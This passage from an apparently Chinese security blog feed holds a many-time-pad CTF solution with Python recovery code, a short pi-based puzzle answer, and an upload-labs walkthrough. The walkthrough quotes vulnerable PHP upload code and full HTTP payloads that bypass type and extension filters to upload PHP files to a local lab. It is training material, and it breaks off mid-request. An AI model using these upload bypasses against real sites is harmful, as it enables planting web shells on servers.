⨁ M_i[col] = M_1[col] ⨁ M_i[col] ⨁ 0x20$</strong></p><p>代码如下：</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> Crypto.Util.strxor <span class="hljs-keyword">as</span> xo<span class="hljs-keyword">import</span> libnum, codecs, numpy <span class="hljs-keyword">as</span> np<span class="hljs-keyword">def</span> <span class="hljs-title function_">isChr</span>(<span class="hljs-params">x</span>):    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) &lt;= x <span class="hljs-keyword">and</span> x &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>): <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) &lt;= x <span class="hljs-keyword">and</span> x &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>): <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">infer</span>(<span class="hljs-params">index, pos</span>):    <span class="hljs-keyword">if</span> msg[index, pos] != <span class="hljs-number">0</span>:        <span class="hljs-keyword">return</span>    msg[index, pos] = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27; &#x27;</span>)    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):        <span class="hljs-keyword">if</span> x != index:            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27; &#x27;</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">know</span>(<span class="hljs-params">index, pos, ch</span>):    msg[index, pos] = <span class="hljs-built_in">ord</span>(ch)    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):        <span class="hljs-keyword">if</span> x != index:            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ <span class="hljs-built_in">ord</span>(ch)dat = []<span class="hljs-keyword">def</span> <span class="hljs-title function_">getSpace</span>():    <span class="hljs-keyword">for</span> index, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(c):        res = [xo.strxor(x, y) <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> c <span class="hljs-keyword">if</span> x!=y]        f = <span class="hljs-keyword">lambda</span> pos: <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(isChr, [s[pos] <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> res])))        cnt = [f(pos) <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x))]        <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(x)):            dat.append((f(pos), index, pos))c = [codecs.decode(x.strip().encode(), <span class="hljs-string">&#x27;hex&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Problem.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).readlines()]msg = np.zeros([<span class="hljs-built_in">len</span>(c), <span class="hljs-built_in">len</span>(c[<span class="hljs-number">0</span>])], dtype=<span class="hljs-built_in">int</span>)getSpace()dat = <span class="hljs-built_in">sorted</span>(dat)[::-<span class="hljs-number">1</span>]<span class="hljs-keyword">for</span> w, index, pos <span class="hljs-keyword">in</span> dat:    infer(index, pos)know(<span class="hljs-number">10</span>, <span class="hljs-number">21</span>, <span class="hljs-string">&#x27;y&#x27;</span>)know(<span class="hljs-number">8</span>, <span class="hljs-number">14</span>, <span class="hljs-string">&#x27;n&#x27;</span>)<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>.join([<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> x]) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> msg]))key = xo.strxor(c[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> msg[<span class="hljs-number">0</span>]]).encode())<span class="hljs-built_in">print</span>(key)</code></pre></div><p>输出：</p><div class="code-wrapper"><pre><code class="hljs applescript">Dear Friend, This <span class="hljs-built_in">time</span> I understood <span class="hljs-keyword">my</span> mistake <span class="hljs-keyword">and</span> used One <span class="hljs-built_in">time</span> pad encryption scheme, I heard <span class="hljs-keyword">that</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> only encryption method <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> mathematically proven <span class="hljs-keyword">to</span> be <span class="hljs-keyword">not</span> cracked ever <span class="hljs-keyword">if</span> <span class="hljs-keyword">the</span> key <span class="hljs-keyword">is</span> kept secure, Let Me know <span class="hljs-keyword">if</span> you agree <span class="hljs-keyword">with</span> <span class="hljs-keyword">me</span> <span class="hljs-keyword">to</span> use this encryption scheme always...b&#x27;afctf&#123;OPT_1s_Int3rest1ng&#125;!&#x27;</code></pre></div><h2 id="总结">总结</h2><p>Many-Time-Pad攻击利用了密钥重用导致明文信息线性泄漏的特性，结合自然语言的冗余性，通过统计分析恢复明文。这再次验证了OTP的核心安全准则：密钥绝对不可重用。<br>Many-Time-Pad 是不安全的。我们这一次的攻击，条件稍微有点苛刻：明文必须是英文句子、截获到的密文必须足够多。但是只要攻击者有足够的耐心进行词频分析、监听大量密文，还是能够发起极具威胁性的攻击。如果铁了心要用直接xor来加密信息，应当采用一次一密(One-Time-Pad)</p><p>参考：</p><ol><li><a href="https://www.ruanx.net/many-time-pad/">Pion1eer - Many-Time-Pad 攻击</a></li><li><a href="https://blog.csdn.net/m0_63303407/article/details/127193042">异或 MTP 攻击 - CSDN</a></li><li><a href="https://www.zhihu.com/question/26576521">多次使用“一次性密钥”(one-time pad)为什么不安全？- 知乎</a></li><li><a href="https://secinject.wordpress.com/2015/08/12/many-time-pad-attack/">SecInject - Many time pad attack</a></li><li><a href="https://dl.acm.org/doi/10.5555/829513.830504">ACM Digital Library</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界Crypto-cat&#39;s gift</title>
    <link href="/2025/06/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-cat&#39;s%20gift/"/>
    <url>/2025/06/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-cat&#39;s%20gift/</url>
    
    <content type="html"><![CDATA[<h3 id="Description">Description:</h3><p>如图所示，下面这只好心的猫猫给你送来了跨年礼物。由于礼物不好拿，所以<strong>猫猫把礼物平均分成了四份，但是其中一份不小心掉在地上散落成了无数片，变成了 1 - 1/3 + 1/5 - 1/7 + …</strong></p><p>聪明的你能算出或猜出猫猫的礼物是什么吗？<br> <br><strong>flag示例:</strong> <code>CatCTF&#123;apple&#125;</code> <code>CatCTF&#123;banana&#125;</code></p><span id="more"></span><p>关键：<strong>Gregory-Leibniz 公式</strong><br>德国数学家莱布尼茨（Leibniz）于 1674 年曾提出 Gregory-Leibniz 公式来计算π：<br>$π / 4 = 1 − 1 / 3 + 1 / 5 − 1 / 7 + 1 / 9 + . . . π/4 = 1 - 1/3 +1/5 - 1/7 + 1/9+ …π/4=1−1/3+1/5−1/7+1/9+…$<br>得到flag：<code>CatCTF&#123;pie</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto基础数学知识-数论</title>
    <link href="/2025/06/21/Crypto%E5%9F%BA%E7%A1%80%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86-%E6%95%B0%E8%AE%BA/"/>
    <url>/2025/06/21/Crypto%E5%9F%BA%E7%A1%80%E6%95%B0%E5%AD%A6%E7%9F%A5%E8%AF%86-%E6%95%B0%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs靶场小计</title>
    <link href="/2025/06/17/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/"/>
    <url>/2025/06/17/upload-labs%E9%9D%B6%E5%9C%BA%E5%B0%8F%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1>Introduction：</h1><ul><li><strong>Repo Address</strong>: <a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></li><li><strong>Description</strong>：upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</li></ul><span id="more"></span><h1>正文开始</h1><h2 id="Pass-01">Pass-01</h2><p><strong>源码分析</strong>:</p><div class="code-wrapper"><pre><code class="hljs Javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-comment">//定义允许上传的文件类型</span>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;    <span class="hljs-comment">//提取上传文件的类型</span>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));    <span class="hljs-comment">//判断上传文件类型是否允许上传</span>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;        <span class="hljs-title function_">alert</span>(errMsg);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;&#125;</code></pre></div><p>在源码中我们可以看到其在客户端使用了js对不合法图片进行了检查，因此只需要在Firefox浏览器中禁用js即可绕过</p><h2 id="Pass-02">Pass-02</h2><p><strong>源码分析</strong>:</p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><p>在源码的<code>type</code>一处我们得知其对文件的类型做了限制，我们可以用BurpSuite或Yakit把数据包拉下来，然后将文件类型修改为对应的类型即可绕过</p><div class="code-wrapper"><pre><code class="hljs bash">payload:POST /upload-labs/Pass-02/index.php HTTP/1.1Host: 127.0.0.1Accept-Encoding: gzip, deflate, br, zstdAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Language: en-US,en;q=0.9Sec-Fetch-Mode: navigatesec-ch-ua-mobile: ?0Sec-Fetch-Dest: documentUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36Referer: http://127.0.0.1/upload-labs/Pass-02/index.phpOrigin: http://127.0.0.1Sec-Fetch-User: ?1Sec-Fetch-Site: same-originCache-Control: max-age=0Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9OENpdlcocFeQ6oYsec-ch-ua: <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;137&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;137&quot;</span>, <span class="hljs-string">&quot;Not/A)Brand&quot;</span>;v=<span class="hljs-string">&quot;24&quot;</span>sec-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span>Content-Length: 325------WebKitFormBoundary9OENpdlcocFeQ6oYContent-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.php&quot;</span>Content-Type: image/png&lt;?php phpinfo(); ?&gt; ------WebKitFormBoundary9OENpdlcocFeQ6oYContent-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span>------WebKitFormBoundary9OENpdlcocFeQ6oY--</code></pre></div><h2 id="Pass-03">Pass-03</h2><p><strong>源码分析：</strong></p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><p>观察后发现其仅过滤了<code>asp</code>,<code>aspx</code>,<code>php</code>和<code>jsp</code>这四种后缀名，这里举一个例子<code>php</code>-&gt;<code>phtml</code>以混淆视听</p><div class="code-wrapper"><pre><code class="hljs bash">payload:POST /upload-labs/Pass-03/index.php HTTP/1.1Host: 127.0.0.1Upgrade-Insecure-Requests: 1Sec-Fetch-User: ?1Referer: http://127.0.0.1/upload-labs/Pass-03/index.phpSec-Fetch-Dest: documentContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryAl4mS15DQA2JvZiOCache-Control: max-age=0Accept-Language: en-US,en;q=0.9Accept-Encoding: gzip, deflate, br, zstdOrigin: http://127.0.0.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Mode: navigatesec-ch-ua-mobile: ?0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36Sec-Fetch-Site: same-originsec-ch-ua: <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;137&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;137&quot;</span>, <span class="hljs-string">&quot;Not/A)Brand&quot;</span>;v=<span class="hljs-string">&quot;24&quot;</span>sec-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span>Content-Length: 325------WebKitFormBoundaryAl4mS15DQA2JvZiOContent-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.Phtml&quot;</span>Content-Type: application/octet-stream&lt;?php phpinfo(); ?&gt; ------WebKitFormBoundaryAl4mS15DQA2JvZiOContent-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span>------WebKitFormBoundaryAl4mS15DQA2JvZiO--</code></pre></div><h2 id="Pass-04">Pass-04</h2><p><strong>源码分析：</strong></p><div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;    &#125;&#125;</code></pre></div><p>在这里我们可以观察出其过滤了很多后缀名，其次<code>转换大小写</code>使得我们无法通过混淆大小写以绕过，但是其中的<code>去除字符串::$DATA</code>和<code>收尾去空</code>使得我们可以用类似于双后缀的方法绕过，这样它会把后面那个后缀吃掉而只保留前面的后缀，且只验证被吃掉的那个后缀，最终成功解析</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload-labs/Pass-04/index.php</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryVUBAzK6LwIFArjzI<span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.9<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/upload-labs/Pass-04/index.php<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36<span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;137&quot;, &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot;<span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br, zstd<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>325<span class="language-php">------WebKitFormBoundaryVUBAzK6LwIFArjzI</span><span class="language-php">Content-Disposition: form-data; name=<span 